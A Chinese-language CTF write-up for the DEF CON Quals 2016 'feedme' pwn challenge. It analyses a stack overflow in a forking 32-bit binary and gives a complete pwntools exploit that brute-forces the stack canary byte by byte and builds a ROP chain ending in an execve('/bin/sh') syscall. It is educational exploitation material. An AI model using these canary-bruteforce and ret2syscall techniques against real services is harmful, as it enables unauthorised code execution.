---
!!! warning
    The current page still doesn't have a translation for this language.

    You can read it through google translate.

    Besides, you can also help to translate it: [Contributing](https://ctf-wiki.org/en/contribute/before-contributing/). 


title: nightmare 2.11.defcon quals2016 feedme-wp
date: 2023-08-15 20:39:38
tags:
- CTF
- pwn
- dcquals2016
- nightmare
- stack 
- canary  
- ret2syscall
categories:
- pwn-wp
---

[相关资源](https://github.com/guyinatuxedo/nightmare/tree/master/modules/07-bof_static/dcquals16_feedme)  

## 文件分析

```python
$ checksec feedme
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

```sh
$ ./feedme
FEED ME!
!0000000000000000000000000000000000000000000000000000000000000000000
ATE 30303030303030303030303030303030...
*** stack smashing detected ***: ./feedme terminated
Child exit.
FEED ME!
...
```

## 代码分析

首先`SHIFT+F5`利用签名文件恢复符号表，具体教程见[符号表恢复](https://antel0p3.github.io/2023/08/14/symbol-restore/) 
  ![img](https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/08/15/dcquals16-feedme/0x1.png?raw=true)

1. 可以看到循环fork创建子线程，子线程执行`sub_8049036` 函数

   ![img](https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/08/15/dcquals16-feedme/0x2.png?raw=true)

2. `sub_8049036` 函数中`I`首先读取一个byte

3. `II`读取这个byte值个数个byte到v3中，明显此处存在栈溢出

4. `III`处明显存在canary栈溢出检查

## 攻击方法

该文件是静态链接的，但是没有找到库函数`system`，并且开启了栈不可执行 
`ALT+T` 也没有找到`syscall` ，但是存在有`int 80h` 可以触发系统调用  `sys_execve`

参数：

```assembly
eax -> 0xb	# sys_execve调用号
ebx -> '/bin/sh'指针
ecx -> 0
edx -> 0
```

**fork出的子线程canary是不变的**，由此我们可以对canary进行爆破，然后溢出构造pop链

爆破方法：从低（最低位一定是\x00，不用爆破）到高一个一个字节遍历覆盖，如果没有发现输出`stack smashing`，则说明当前字节正确，固定当前已获取的字节，接着下个字节爆破

## exp

```python
from pwn import *
import sys

pty = process.PTY
context(os='linux', arch='i386', log_level='debug')

mode = ''
if len(sys.argv) > 1:
    mode = sys.argv[1]

proc = process("./feedme")

def s(x): proc.send(x)
def sl(x): return proc.sendline(x)
def sd(x): return proc.send(x)
def sla(x, y): return proc.sendlineafter(x, y)
def sa(x, y): return proc.sendafter(x, y)
def ru(x): return proc.recvuntil(x)
def rc(): return proc.recv()
def rl(): return proc.recvline()
def li(con): return log.info(con)
def ls(con): return log.success(con)
def pi(): return proc.interactive()
def pcls(): return proc.close()
def ga(): return u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))

gscript = '''
    b main
    b * 0x08049036
    b * 0x080490C9
    set follow-fork-mode child
    
'''
if mode == '-d':
    gdb.attach(proc, gdbscript=gscript)

canary = b'\x00'	# 最低位

for i in range(1, 4):	# 剩下三位爆破
    for j in range(0,0x100):	# 0x00-0xff
        sa(b'ME!', p8(32+i+1)+b'h'*32+ canary + p8(j))	# size + padding + canary
        res = ru(b'exit.')
        if b'smashing' not in res:	# 正确
            canary = canary + p8(j)	# 更新canary
            break					# 去下一个字节

eax_ret = 0x080bb496
ebx_ret = 0x080481c9
edx_ret = 0x0806f34a
ecx_ebx_ret = 0x0806f371
mov_eax2pedx = 0x0809a7ed
int_80 = 0x08049761
dest = 0x080EBF40

payload = b'h'*32 + canary + p32(0)* 3	# padding + canary + padding2ret
payload += p32(edx_ret)+ p32(dest)	# edx = str_ptr
payload += p32(eax_ret) + b'/bin' + p32(mov_eax2pedx) # eax = b'/bin'; mov dword ptr [edx], eax
payload += p32(edx_ret)+ p32(dest+4)	# edx = str_ptr+4
payload += p32(eax_ret) + b'/sh\x00' + p32(mov_eax2pedx) # eax = b'/sh\x00'; mov dword ptr [edx], eax
payload += p32(eax_ret) + p32(0xb)	# eax = 0xb
payload += p32(edx_ret) + p32(0)	# edx = 0

payload += p32(ecx_ebx_ret) + p32(0) + p32(dest)	# ecx = 0; ebx = str_ptr
payload += p32(int_80)

sa(b'ME!', p8(len(payload))+payload)	# size + payload


pi()
pause()
```


---